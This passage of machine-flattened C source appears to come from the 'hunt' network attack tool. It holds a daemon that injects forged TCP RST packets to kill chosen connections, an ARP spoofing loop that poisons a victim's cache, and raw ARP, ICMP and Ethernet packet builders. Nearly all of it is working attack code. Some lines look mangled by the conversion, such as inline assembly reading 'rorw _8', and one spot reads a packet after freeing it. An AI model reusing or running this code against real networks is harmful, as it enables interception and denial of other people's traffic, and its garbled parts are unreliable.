    {
      if(!((rdset.__fds_bits[(signed long int)(fd / 8)] & (signed long int)(1UL << fd % 8)) == 0l))
      {
        return_value_read_4=read(fd, (void *)&req, sizeof(struct req) /*16ul*/ );
        if((unsigned long int)return_value_read_4 == sizeof(struct req) /*16ul*/ )
        {
          addr.s_addr = req.ip;
          host_ent = (struct hostent *)(void *)0;
          host_ent=gethostbyaddr((const void *)(char *)&addr, (unsigned int)sizeof(struct in_addr) /*4ul*/ , 2);
          res = (struct res *)buf;
          if(host_ent == ((struct hostent *)NULL))
          {
            res->err = 1;
            res->ip = req.ip;
            res->name_len = 0;
          }

          else
          {
            name = host_ent->h_name;
            res->err = 0;
            res->ip = req.ip;
            unsigned long int return_value_strlen_3;
            return_value_strlen_3=strlen(name);
            res->name_len = (signed int)(return_value_strlen_3 + (unsigned long int)1);
            strcpy(res->name, name);
            /* assertion (void *) res->name == (void *)(res + 1) */
            assert((void *)res->name == (void *)(res + (signed long int)1));
          }
          write(fd, (const void *)res, sizeof(struct res) /*12ul*/  + (unsigned long int)res->name_len);
        }

      }

    }

  }
  close(fd);
  exit(0);
}

// ri_allocate
// file pktrelay.c line 78
static struct relay_item * ri_allocate()
{
  struct relay_item *ri;
  void *return_value_malloc_1;
  return_value_malloc_1=malloc(sizeof(struct relay_item) /*280ul*/ );
  ri = (struct relay_item *)return_value_malloc_1;
  /* assertion ri */
  assert(ri != ((struct relay_item *)NULL));
  memset((void *)ri, 0, sizeof(struct relay_item) /*280ul*/ );
  pthread_mutex_init(&ri->mutex, (const union anonymous_9 *)(void *)0);
  pthread_cond_init(&ri->lock_cond, (const union anonymous_9 *)(void *)0);
  ri->ethtap_fd = -1;
  return ri;
}

// ri_free
// file pktrelay.c line 91
static void ri_free(struct relay_item *ri)
{
  ri_wait_for_release(ri);
  pthread_cond_destroy(&ri->lock_cond);
  pthread_mutex_destroy(&ri->mutex);
  if(ri->ethtap_fd >= 0)
    close(ri->ethtap_fd);

  if(!(ri->ethtap_name == ((char *)NULL)))
    free((void *)ri->ethtap_name);

  free((void *)ri);
}

// ri_release
// file pktrelay.c line 62
static void ri_release(struct relay_item *ri)
{
  pthread_mutex_lock(&ri->mutex);
  ri->lock_count = ri->lock_count - 1;
  if(ri->lock_count == 0)
    pthread_cond_broadcast(&ri->lock_cond);

  pthread_mutex_unlock(&ri->mutex);
}

// ri_wait_for_release
// file pktrelay.c line 70
static void ri_wait_for_release(struct relay_item *ri)
{
  pthread_mutex_lock(&ri->mutex);
  while(ri->lock_count >= 1)
    pthread_cond_wait(&ri->lock_cond, &ri->mutex);
  pthread_mutex_unlock(&ri->mutex);
}

// ri_want
// file pktrelay.c line 55
static void ri_want(struct relay_item *ri)
{
  pthread_mutex_lock(&ri->mutex);
  ri->lock_count = ri->lock_count + 1;
  pthread_mutex_unlock(&ri->mutex);
}

// rst
// file rst.c line 50
void rst(struct conn_info *ci, signed int count, signed int rstdst)
{
  struct tcp_spec ts;
  signed int i;
  signed int tmp_if_expr_2;
  unsigned short int tmp_statement_expression_1;
  signed int tmp_if_expr_4;
  unsigned short int tmp_statement_expression_3;
  if(!(rstdst == 0))
  {
    ts.saddr = ci->src_addr;
    ts.daddr = ci->dst_addr;
    ts.sport = ci->src_port;
    ts.dport = ci->dst_port;
    ts.src_mac = (char *)ci->dst.dst_mac;
    ts.dst_mac = (char *)ci->dst.src_mac;
    if(!(ci->src.window == 0))
      tmp_if_expr_2 = (signed int)ci->src.window;

    else
    {
      unsigned short int rst__1__1__1____v;
      unsigned short int __x = (unsigned short int)242;
      asm("rorw _8, %w0" : "=r"(rst__1__1__1____v) : "0"(__x) : "cc");
      tmp_statement_expression_1 = rst__1__1__1____v;
      tmp_if_expr_2 = (signed int)tmp_statement_expression_1;
    }
    ts.window = (unsigned short int)tmp_if_expr_2;
    ts.id = ci->src.id;
  }

  else
  {
    ts.saddr = ci->dst_addr;
    ts.daddr = ci->src_addr;
    ts.sport = ci->dst_port;
    ts.dport = ci->src_port;
    ts.src_mac = (char *)ci->src.dst_mac;
    ts.dst_mac = (char *)ci->src.src_mac;
    if(!(ci->dst.window == 0))
      tmp_if_expr_4 = (signed int)ci->dst.window;

    else
    {
      unsigned short int __v;
      unsigned short int rst__1__2__1____x = (unsigned short int)242;
      asm("rorw _8, %w0" : "=r"(__v) : "0"(rst__1__2__1____x) : "cc");
      tmp_statement_expression_3 = __v;
      tmp_if_expr_4 = (signed int)tmp_statement_expression_3;
    }
    ts.window = (unsigned short int)tmp_if_expr_4;
    ts.id = ci->dst.id;
  }
  ts.ack = 1;
  ts.rst = 1;
  ts.psh = 0;
  ts.data = (char *)(void *)0;
  ts.data_len = 0;
  i = 0;
  for( ; !(i >= count); i = i + 1)
  {
    if(!(rstdst == 0))
    {
      unsigned int return_value___bswap_32_5;
      return_value___bswap_32_5=__bswap_32_link2((unsigned int)ci->dst.next_d_seq);
      unsigned int return_value___bswap_32_6;
      return_value___bswap_32_6=__bswap_32_link2(return_value___bswap_32_5 + (unsigned int)i);
      ts.seq = (unsigned long int)return_value___bswap_32_6;
      unsigned int return_value___bswap_32_7;
      return_value___bswap_32_7=__bswap_32_link2((unsigned int)ci->dst.next_seq);
      unsigned int return_value___bswap_32_8;
      return_value___bswap_32_8=__bswap_32_link2(return_value___bswap_32_7 + (unsigned int)i);
      ts.ack_seq = (unsigned long int)return_value___bswap_32_8;
    }

    else
    {
      unsigned int return_value___bswap_32_9;
      return_value___bswap_32_9=__bswap_32_link2((unsigned int)ci->src.next_d_seq);
      unsigned int return_value___bswap_32_10;
      return_value___bswap_32_10=__bswap_32_link2(return_value___bswap_32_9 + (unsigned int)i);
      ts.seq = (unsigned long int)return_value___bswap_32_10;
      unsigned int return_value___bswap_32_11;
      return_value___bswap_32_11=__bswap_32_link2((unsigned int)ci->src.next_seq);
      unsigned int return_value___bswap_32_12;
      return_value___bswap_32_12=__bswap_32_link2(return_value___bswap_32_11 + (unsigned int)i);
      ts.ack_seq = (unsigned long int)return_value___bswap_32_12;
    }
    send_tcp_packet(&ts);
  }
}

// rst_add_item
// file rstd.c line 254
static void rst_add_item(void)
{
  struct rst_db_item *dbi;
  unsigned int src_ip;
  unsigned int dst_ip;
  unsigned int src_mask;
  unsigned int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  signed int mode;
  signed int syn_mode;
  signed int nr;
  signed int return_value_menu_choose_host_mask_ports_dfl_1;
  return_value_menu_choose_host_mask_ports_dfl_1=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, &src_mask, (unsigned int *)src_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
  if(return_value_menu_choose_host_mask_ports_dfl_1 >= 0)
  {
    signed int return_value_menu_choose_host_mask_ports_dfl_2;
    return_value_menu_choose_host_mask_ports_dfl_2=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, &dst_mask, (unsigned int *)dst_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
    if(return_value_menu_choose_host_mask_ports_dfl_2 >= 0)
    {
      mode=menu_choose_sdb("mode", (char)98);
      if(!(mode == -1))
      {
        syn_mode=menu_choose_char("reset only syn y/n", "yn", (char)121);
        if(!(syn_mode == -1))
        {
          signed int return_value_list_count_3;
          return_value_list_count_3=list_count(&l_rst_db);
          signed int return_value_list_count_4;
          return_value_list_count_4=list_count(&l_rst_db);
          nr=menu_choose_unr("insert at", 0, return_value_list_count_3, return_value_list_count_4);
          if(!(nr == -1))
          {
            void *return_value_malloc_5;
            return_value_malloc_5=malloc(sizeof(struct rst_db_item) /*168ul*/ );
            dbi = (struct rst_db_item *)return_value_malloc_5;
            memset((void *)dbi, 0, sizeof(struct rst_db_item) /*168ul*/ );
            dbi->src_addr = src_ip;
            dbi->src_mask = src_mask;
            port_htons((unsigned int *)src_ports);
            memcpy((void *)dbi->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
            dbi->dst_addr = dst_ip;
            dbi->dst_mask = dst_mask;
            port_htons((unsigned int *)dst_ports);
            memcpy((void *)dbi->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
            dbi->rst_mode=sdb_to_int((char)mode);
            switch(syn_mode)
            {
              case 121:
              {
                dbi->rst_only_syn = 1;
                break;
              }
              case 110:
                dbi->rst_only_syn = 0;
            }
            list_insert_at(&l_rst_db, nr, (void *)dbi);
          }

        }

      }

    }

  }

}

// rst_daemon_start
// file rstd.c line 168
static void rst_daemon_start(void)
{
  if(!(rstd_running == 0))
    printf("daemon already running\n");

  else
  {
    list_produce_start(&l_rst_packet);
    ifunc_tcp.func = func_tcp_packet;
    ifunc_tcp.arg = (void *)0;
    list_enqueue(&l_ifunc_tcp, (void *)&ifunc_tcp);
    pthread_create(&rstd_thr, (const union pthread_attr_t *)(void *)0, rst_daemon_thr, (void *)0);
    rstd_running = 1;
    printf("rst daemon started\n");
  }
}

// rst_daemon_stop
// file rstd.c line 184
static void rst_daemon_stop(void)
{
  if(rstd_running == 0)
    printf("daemon isn't running\n");

  else
  {
    list_remove(&l_ifunc_tcp, (void *)&ifunc_tcp);
    packet_flush(&l_rst_packet);
    list_produce_done(&l_rst_packet);
    pthread_join(rstd_thr, (void **)(void *)0);
    rstd_running = 0;
    printf("rst daemon stoped\n");
  }
}

// rst_daemon_thr
// file rstd.c line 91
static void * rst_daemon_thr(void *arg)
{
  struct iphdr *iph;
  struct tcphdr *tcph;
  struct conn_info *ci;
  struct conn_info __ci;
  struct conn_info *pci;
  struct user_conn_info uci;
  struct packet *p;
  struct timespec ts;
  signed int rst_mode;
  pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
  signed int return_value_getpid_1;
  return_value_getpid_1=getpid();
  setpriority(0, (unsigned int)return_value_getpid_1, 0);
  void *return_value_list_consume_2;
  unsigned int tmp_if_expr_5;
  do
  {
    return_value_list_consume_2=list_consume(&l_rst_packet, (struct timespec *)(void *)0);
    p = (struct packet *)return_value_list_consume_2;
    if(p == ((struct packet *)NULL))
      break;

    iph = p->p_iph;
    tcph = p->p_hdr.p_tcph;
    uci.src_addr = (unsigned long int)iph->saddr;
    uci.dst_addr = (unsigned long int)iph->daddr;
    uci.src_port = tcph->_anon0._anon1.source;
    uci.dst_port = tcph->_anon0._anon1.dest;
    pci=conn_get(&uci);
    if(pci == ((struct conn_info *)NULL))
    {
      __ci.src_addr = (unsigned long int)iph->saddr;
      __ci.dst_addr = (unsigned long int)iph->daddr;
      __ci.src_port = tcph->_anon0._anon1.source;
      __ci.dst_port = tcph->_anon0._anon1.dest;
      unsigned int return_value___bswap_32_3;
      return_value___bswap_32_3=__bswap_32_link3(tcph->_anon0._anon1.seq);
      unsigned int return_value___bswap_32_4;
      return_value___bswap_32_4=__bswap_32_link3(return_value___bswap_32_3 + (unsigned int)p->p_data_len);
      __ci.src.next_seq = (unsigned long int)return_value___bswap_32_4;
      if(!(tcph->_anon0._anon1.ack == 0))
        tmp_if_expr_5 = tcph->_anon0._anon1.ack_seq;

      else
        tmp_if_expr_5 = (unsigned int)0;
      __ci.src.next_d_seq = (unsigned long int)tmp_if_expr_5;
      memcpy((void *)__ci.src.src_mac, (const void *)p->p_ethh->h_source, (unsigned long int)6);
      memcpy((void *)__ci.src.dst_mac, (const void *)p->p_ethh->h_dest, (unsigned long int)6);
      __ci.src.window = tcph->_anon0._anon1.window;
      __ci.src.id = iph->id;
      __ci.dst.next_seq = __ci.src.next_d_seq;
      __ci.dst.next_d_seq = __ci.src.next_seq;
      memcpy((void *)__ci.dst.src_mac, (const void *)p->p_ethh->h_dest, (unsigned long int)6);
      memcpy((void *)__ci.dst.dst_mac, (const void *)p->p_ethh->h_source, (unsigned long int)6);
      __ci.dst.window = tcph->_anon0._anon1.window;
      __ci.dst.id = iph->id;
      ci = &__ci;
    }

    else
      ci = pci;
    packet_free(p);
    rst_mode = (signed int)p->p_arg[(signed long int)2];
    ts.tv_sec = (signed long int)0;
    ts.tv_nsec = (signed long int)100000000;
    switch(rst_mode)
    {
      case 0:
      {
        rst(ci, 4, 0);
        nanosleep(&ts, (struct timespec *)(void *)0);
        rst(ci, 4, 0);
        break;
      }
      case 1:
      {
        rst(ci, 4, 1);
        nanosleep(&ts, (struct timespec *)(void *)0);
        rst(ci, 4, 1);
        break;
      }
      case 2:
      {
        rst(ci, 4, 0);
        rst(ci, 4, 1);
        nanosleep(&ts, (struct timespec *)(void *)0);
        rst(ci, 4, 0);
        rst(ci, 4, 1);
      }
    }
    if(!(pci == ((struct conn_info *)NULL)))
      conn_free(pci);

  }
  while((_Bool)1);
  return (void *)0;
}

// rst_del_item
// file rstd.c line 346
static void rst_del_item(void)
{
  signed int i;
  struct rst_db_item *dbi;
  rst_list_items();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_rst_db);
  i=menu_choose_unr("item nr. to delete", 0, return_value_list_count_1 - 1, -1);
  if(i >= 0)
  {
    void *return_value_list_remove_at_2;
    return_value_list_remove_at_2=list_remove_at(&l_rst_db, i);
    dbi = (struct rst_db_item *)return_value_list_remove_at_2;
    free((void *)dbi);
  }

}

// rst_list_items
// file rstd.c line 238
static void rst_list_items(void)
{
  struct list_iterator li;
  struct rst_db_item *dbi;
  signed int i = 0;
  list_iter_set(&li, &l_rst_db);
  void *return_value_list_iter_get_1;
  signed int tmp_post_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    dbi = (struct rst_db_item *)return_value_list_iter_get_1;
    if(dbi == ((struct rst_db_item *)NULL))
      break;

    tmp_post_2 = i;
    i = i + 1;
    db_item_print(tmp_post_2, dbi);
    if(i % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  list_iter_end(&li);
}

// rst_mod_item
// file rstd.c line 299
static void rst_mod_item(void)
{
  struct rst_db_item *dbi;
  unsigned int src_ip;
  unsigned int dst_ip;
  unsigned int src_mask;
  unsigned int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  signed int mode;
  signed int syn_mode;
  signed int nr;
  rst_list_items();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_rst_db);
  signed int return_value_list_count_2;
  return_value_list_count_2=list_count(&l_rst_db);
  nr=menu_choose_unr("choose item", 0, return_value_list_count_1 - 1, return_value_list_count_2 - 1);
  if(!(nr == -1))
  {
    void *return_value_list_at_3;
    return_value_list_at_3=list_at(&l_rst_db, nr);
    dbi = (struct rst_db_item *)return_value_list_at_3;
    if(!(dbi == ((struct rst_db_item *)NULL)))
    {
      signed int return_value_menu_choose_host_mask_ports_dfl_4;
      return_value_menu_choose_host_mask_ports_dfl_4=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, &src_mask, (unsigned int *)src_ports, dbi->src_addr, dbi->src_mask, (signed int *)dbi->src_ports);
      if(return_value_menu_choose_host_mask_ports_dfl_4 >= 0)
      {
        signed int return_value_menu_choose_host_mask_ports_dfl_5;
        return_value_menu_choose_host_mask_ports_dfl_5=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, &dst_mask, (unsigned int *)dst_ports, dbi->dst_addr, dbi->dst_mask, (signed int *)dbi->dst_ports);
        if(return_value_menu_choose_host_mask_ports_dfl_5 >= 0)
        {
          char return_value_int_to_sdb_6;
          return_value_int_to_sdb_6=int_to_sdb(dbi->rst_mode);
          mode=menu_choose_sdb("mode", return_value_int_to_sdb_6);
          if(!(mode == -1))
          {
            syn_mode=menu_choose_char("reset only syn y/n", "yn", (char)(dbi->rst_only_syn != 0 ? 121 : 110));
            if(!(syn_mode == -1))
            {
              port_htons((unsigned int *)src_ports);
              port_htons((unsigned int *)dst_ports);
              dbi->src_addr = src_ip;
              dbi->src_mask = src_mask;
              memcpy((void *)dbi->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
              dbi->dst_addr = dst_ip;
              dbi->dst_mask = dst_mask;
              memcpy((void *)dbi->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
              dbi->rst_mode=sdb_to_int((char)mode);
              switch(syn_mode)
              {
                case 121:
                {
                  dbi->rst_only_syn = 1;
                  break;
                }
                case 110:
                  dbi->rst_only_syn = 0;
              }
            }

          }

        }

      }

    }

  }

}

// rstd_menu
// file hunt.h line 562
void rstd_menu(void)
{
  char *r_menu = "s/k)   start/stop daemon\nl)     list reset database\na/m/d) add/mod/del entry\nx)     return\n";
  char *r_keys = "skladmx";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    signed int return_value_menu_1;
    return_value_menu_1=menu("reset daemon", r_menu, "rstd", r_keys, (char)0);
    switch(return_value_menu_1)
    {
      case 115:
      {
        rst_daemon_start();
        break;
      }
      case 107:
      {
        rst_daemon_stop();
        break;
      }
      case 108:
      {
        rst_list_items();
        break;
      }
      case 97:
      {
        rst_add_item();
        break;
      }
      case 100:
      {
        rst_del_item();
        break;
      }
      case 109:
      {
        rst_mod_item();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// run_arpspoof_intr
// file arpspoof.c line 1436
static void run_arpspoof_intr(signed int sig)
{
  run_arpspoof = 0;
}

// run_arpspoof_until_successed
// file arpspoof.c line 1458
signed int run_arpspoof_until_successed(struct arp_spoof_info *asi)
{
  struct sigaction sa;
  struct sigaction sa_old;
  struct timespec timeout;
  signed int retval;
  retval=find_asi_dst_mac(asi, "dst mac isn't known\n");
  signed int return_value_arpspoof_test_1;
  if(!(retval >= 0))
    return retval;

  else
  {
    printf("CTRL-C to break\n");
    sa.__sigaction_handler.sa_handler = run_arpspoof_intr;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0x10000000;
    sigaction(2, &sa, &sa_old);
    pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
    run_arpspoof = 1;
    do
    {
      return_value_arpspoof_test_1=arpspoof_test(asi);
      if(return_value_arpspoof_test_1 == 0)
        break;

      if(run_arpspoof == 0)
        break;

      printf(".");
      fflush(stdout);
      force_arp_spoof(asi, 4);
      pthread_sigmask(1, &intr_mask, (struct anonymous_3 *)(void *)0);
      timeout.tv_sec = (signed long int)5;
      timeout.tv_nsec = (signed long int)0;
      nanosleep(&timeout, (struct timespec *)(void *)0);
      pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
    }
    while((_Bool)1);
    if(run_arpspoof == 0)
      press_key("\n-- operation canceled - press any key> ");

    pthread_sigmask(1, &intr_mask, (struct anonymous_3 *)(void *)0);
    sigaction(2, &sa_old, (struct sigaction *)(void *)0);
    signed int return_value_arpspoof_test_2;
    return_value_arpspoof_test_2=arpspoof_test(asi);
    return return_value_arpspoof_test_2;
  }
}

// sdb_to_int
// file menu.c line 600
signed int sdb_to_int(char mode)
{
  signed int retval;
  switch((signed int)mode)
  {
    case 115:
    {
      retval = 0;
      break;
    }
    case 100:
    {
      retval = 1;
      break;
    }
    case 98:
    {
      retval = 2;
      break;
    }
    default:
      retval = -1;
  }
  return retval;
}

// sdbmode_to_char
// file menu.c line 621
char * sdbmode_to_char(signed int mode)
{
  char *str_mode;
  switch(mode)
  {
    case 0:
    {
      str_mode = "src";
      break;
    }
    case 1:
    {
      str_mode = "dst";
      break;
    }
    case 2:
    {
      str_mode = "both";
      break;
    }
    default:
      str_mode = "err";
  }
  return str_mode;
}

// sec_nanosleep
// file hunt.h line 718
static inline void sec_nanosleep(signed int sec)
{
  struct timespec ts;
  ts.tv_sec = (signed long int)sec;
  ts.tv_nsec = (signed long int)0;
  nanosleep(&ts, (struct timespec *)(void *)0);
}

// send_arp_message
// file hostup.c line 121
static void send_arp_message(unsigned int ip, char *dst_mac)
{
  struct arp_spec as;
  as.src_mac = (char *)my_eth_mac;
  as.dst_mac = dst_mac;
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)1;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  as.oper = (signed int)tmp_statement_expression_1;
  as.sender_mac = (char *)my_eth_mac;
  as.sender_addr = (unsigned long int)my_eth_ip;
  as.target_mac = (char *)mac_zero;
  as.target_addr = (unsigned long int)ip;
  send_arp_packet(&as);
}

// send_arp_packet
// file net.c line 209
signed int send_arp_packet(struct arp_spec *as)
{
  union u_longchar tmp;
  signed int i;
  char buf[512l];
  signed int retval;
  signed int data_len;
  struct msghdr msg;
  struct iovec iov;
  struct ethhdr *eth;
  struct arphdr *arp;
  struct arpeth_hdr *arpeth;
  struct sockaddr spkt;
  eth = (struct ethhdr *)buf;
  memcpy((void *)eth->h_dest, (const void *)as->dst_mac, (unsigned long int)6);
  memcpy((void *)eth->h_source, (const void *)as->src_mac, (unsigned long int)6);
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)0x0806;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  eth->h_proto = tmp_statement_expression_1;
  arp = (struct arphdr *)(eth + (signed long int)1);
  unsigned short int tmp_statement_expression_2;
  unsigned short int send_arp_packet__1__2____v;
  unsigned short int send_arp_packet__1__2____x = (unsigned short int)1;
  asm("rorw _8, %w0" : "=r"(send_arp_packet__1__2____v) : "0"(send_arp_packet__1__2____x) : "cc");
  tmp_statement_expression_2 = send_arp_packet__1__2____v;
  arp->ar_hrd = tmp_statement_expression_2;
  unsigned short int tmp_statement_expression_3;
  unsigned short int send_arp_packet__1__3____v;
  unsigned short int send_arp_packet__1__3____x = (unsigned short int)0x0800;
  asm("rorw _8, %w0" : "=r"(send_arp_packet__1__3____v) : "0"(send_arp_packet__1__3____x) : "cc");
  tmp_statement_expression_3 = send_arp_packet__1__3____v;
  arp->ar_pro = tmp_statement_expression_3;
  arp->ar_hln = (unsigned char)6;
  arp->ar_pln = (unsigned char)4;
  arp->ar_op = (unsigned short int)as->oper;
  arpeth = (struct arpeth_hdr *)(arp + (signed long int)1);
  memcpy((void *)arpeth->ar_sha, (const void *)as->sender_mac, (unsigned long int)6);
  tmp.val = as->sender_addr;
  i = 0;
  for( ; !(i >= 4); i = i + 1)
    arpeth->ar_sip[(signed long int)i] = (unsigned char)tmp.buff[(signed long int)i];
  memcpy((void *)arpeth->ar_tha, (const void *)as->target_mac, (unsigned long int)6);
  tmp.val = as->target_addr;
  i = 0;
  for( ; !(i >= 4); i = i + 1)
    arpeth->ar_tip[(signed long int)i] = (unsigned char)tmp.buff[(signed long int)i];
  memset((void *)&spkt, 0, sizeof(struct sockaddr) /*16ul*/ );
  __builtin_strncpy(spkt.sa_data, eth_device, sizeof(char [14l]) /*14ul*/ );
  memset((void *)&msg, 0, sizeof(struct msghdr) /*56ul*/ );
  msg.msg_name = (void *)&spkt;
  msg.msg_namelen = (unsigned int)sizeof(struct sockaddr) /*16ul*/ ;
  msg.msg_iovlen = (unsigned long int)1;
  msg.msg_iov = &iov;
  iov.iov_base = (void *)buf;
  data_len = (signed int)(sizeof(struct ethhdr) /*14ul*/  + sizeof(struct arphdr) /*8ul*/  + sizeof(struct arpeth_hdr) /*20ul*/ );
  memset((void *)(buf + (signed long int)data_len), 0, (unsigned long int)(60 - data_len));
  iov.iov_len = (unsigned long int)60;
  retval=Sendmsg(linksock, &msg, (unsigned int)0);
  return retval;
}

// send_icmp_packet
// file net.c line 99
signed int send_icmp_packet(struct icmp_spec *is)
{
  signed int tot_len;
  signed int retval;
  char buf[2048l];
  char *data;
  struct ethhdr *eth;
  struct iphdr *ip;
  struct icmphdr *icmp;
  struct msghdr msg;
  struct sockaddr spkt;
  struct iovec iov;
  signed int data_len;
  eth = (struct ethhdr *)buf;
  memcpy((void *)eth->h_dest, (const void *)is->dst_mac, (unsigned long int)6);
  memcpy((void *)eth->h_source, (const void *)is->src_mac, (unsigned long int)6);
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)0x0800;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  eth->h_proto = tmp_statement_expression_1;
  ip = (struct iphdr *)(eth + (signed long int)sizeof(struct ethhdr) /*14ul*/ );
  icmp = (struct icmphdr *)(ip + (signed long int)sizeof(struct iphdr) /*20ul*/ );
  data = (char *)(icmp + (signed long int)sizeof(struct icmphdr) /*8ul*/ );
  memset((void *)ip, 0, sizeof(struct iphdr) /*20ul*/ );
  memset((void *)icmp, 0, sizeof(struct icmphdr) /*8ul*/ );
  if(is->data_len == 0)
  {
    memset((void *)data, 0, (unsigned long int)64);
    data_len = 64;
  }

  else
  {
    memcpy((void *)data, is->data, (unsigned long int)is->data_len);
    data_len = is->data_len;
  }
  ip->version = (unsigned int)4;
  ip->ihl = (unsigned int)5;
  tot_len = (signed int)((unsigned long int)20 + sizeof(struct icmphdr) /*8ul*/  + (unsigned long int)data_len);
  unsigned short int tmp_statement_expression_2;
  unsigned short int send_icmp_packet__1__4____v;
  unsigned short int send_icmp_packet__1__4____x = (unsigned short int)tot_len;
  asm("rorw _8, %w0" : "=r"(send_icmp_packet__1__4____v) : "0"(send_icmp_packet__1__4____x) : "cc");
  tmp_statement_expression_2 = send_icmp_packet__1__4____v;
  ip->tot_len = tmp_statement_expression_2;
  ip->ttl = (unsigned char)64;
  ip->protocol = (unsigned char)1;
  ip->saddr = is->src_addr;
  ip->daddr = is->dst_addr;
  unsigned short int tmp_statement_expression_3;
  unsigned short int send_icmp_packet__1__5____v;
  unsigned short int send_icmp_packet__1__5____x = (unsigned short int)0x4000;
  asm("rorw _8, %w0" : "=r"(send_icmp_packet__1__5____v) : "0"(send_icmp_packet__1__5____x) : "cc");
  tmp_statement_expression_3 = send_icmp_packet__1__5____v;
  ip->frag_off = tmp_statement_expression_3;
  ip->id = (unsigned short int)0;
  ip->check = (unsigned short int)0;
  ip->check=in_cksum((unsigned short int *)ip, 20);
  /* assertion sizeof(struct icmphdr) == 8 */
  assert(sizeof(struct icmphdr) /*8ul*/  == (unsigned long int)8);
  icmp->type = (unsigned char)is->type;
  icmp->code = (unsigned char)is->code;
  icmp->un.gateway = is->un.res;
  icmp->checksum = (unsigned short int)0;
  icmp->checksum=in_cksum((unsigned short int *)icmp, (signed int)(sizeof(struct icmphdr) /*8ul*/  + (unsigned long int)data_len));
  memset((void *)&spkt, 0, sizeof(struct sockaddr) /*16ul*/ );
  __builtin_strncpy(spkt.sa_data, eth_device, sizeof(char [14l]) /*14ul*/ );
  memset((void *)&msg, 0, sizeof(struct msghdr) /*56ul*/ );
  msg.msg_name = (void *)&spkt;
  msg.msg_namelen = (unsigned int)sizeof(struct sockaddr) /*16ul*/ ;
  msg.msg_iovlen = (unsigned long int)1;
  msg.msg_iov = &iov;
  iov.iov_base = (void *)buf;
  iov.iov_len = sizeof(struct ethhdr) /*14ul*/  + (unsigned long int)tot_len;
  retval=Sendmsg(linksock, &msg, (unsigned int)0);
  return retval;
}

// send_icmp_request
// file net.c line 164
void send_icmp_request(unsigned int src_addr, unsigned int dst_addr, char *src_mac, char *dst_mac, unsigned short int seq)
{
  struct icmp_spec icmp;
  icmp.src_addr = src_addr;
  icmp.dst_addr = dst_addr;
  icmp.src_mac = src_mac;
  icmp.dst_mac = dst_mac;
  icmp.type = (signed short int)8;
  icmp.code = (signed short int)0;
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)0xAA;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  icmp.un.idseq.id = tmp_statement_expression_1;
  icmp.un.idseq.seq = seq;
  icmp.data = (void *)0;
  icmp.data_len = 0;
  send_icmp_packet(&icmp);
}

// send_packet
// file net.c line 266
signed int send_packet(struct packet *p)
{
  signed int retval;
  struct sockaddr spkt;
  struct msghdr msg;
  struct iovec iov;
  memset((void *)&spkt, 0, sizeof(struct sockaddr) /*16ul*/ );
  __builtin_strncpy(spkt.sa_data, eth_device, sizeof(char [14l]) /*14ul*/ );
  memset((void *)&msg, 0, sizeof(struct msghdr) /*56ul*/ );
  msg.msg_name = (void *)&spkt;
  msg.msg_namelen = (unsigned int)sizeof(struct sockaddr) /*16ul*/ ;
  msg.msg_iovlen = (unsigned long int)1;
  msg.msg_iov = &iov;
  iov.iov_base = (void *)p->p_raw;
  iov.iov_len = (unsigned long int)p->p_raw_len;
  retval=Sendmsg(linksock, &msg, (unsigned int)0);
  return retval;
}

// send_req_to_slave
// file resolv.c line 240
static void send_req_to_slave(signed int fd, struct list *slaves, struct list *requests)
{
  struct list_iterator li;
  struct slave *sl;
  struct req *r;
  struct req req;
  signed int pipe[2l];
  list_iter_set(&li, slaves);
  signed int return_value_list_count_1;
  void *return_value_list_iter_get_2;
  do
  {
    return_value_list_count_1=list_count(requests);
    if(return_value_list_count_1 == 0)
      break;

    return_value_list_iter_get_2=list_iter_get(&li);
    sl = (struct slave *)return_value_list_iter_get_2;
    if(sl == ((struct slave *)NULL))
      break;

    if(sl->s_req.ip == 0u)
    {
      void *return_value_list_pop_3;
      return_value_list_pop_3=list_pop(requests);
      r = (struct req *)return_value_list_pop_3;
      sl->s_req = *r;
      sl->s_req.next = (struct req *)(void *)0;
      sl->s_timestamp=time((signed long int *)(void *)0);
      req = *r;
      req.next = (struct req *)(void *)0;
      write(sl->s_fd, (const void *)&req, sizeof(struct req) /*16ul*/ );
      free((void *)r);
    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  signed int return_value_list_count_4;
  signed int return_value_list_count_5;
  void *return_value_list_iter_get_8;
  do
  {
    return_value_list_count_4=list_count(requests);
    if(return_value_list_count_4 == 0)
